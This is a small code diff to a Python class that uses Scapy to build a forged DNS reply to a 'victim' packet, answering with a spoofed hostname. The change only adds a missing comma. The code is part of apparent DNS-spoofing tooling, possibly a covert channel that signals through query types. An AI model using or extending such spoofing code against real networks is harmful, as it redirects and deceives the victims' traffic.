@@ -44,7 +44,7 @@ class Bundler():
         dnsqr_layer = self.victim_packet.getlayer(DNSQR)
         return DNS(
             qr=1, rd=1, ra=1, ancount=1, nscount=0, arcount=0,
-            ns=None, ar=None
+            ns=None, ar=None,
             an = DNSRR(
                 rrname=self.fake_hostname, # Update with spoof address
                 type=dnsqr_layer.qtype, # Determines PING, DATA, RECPT
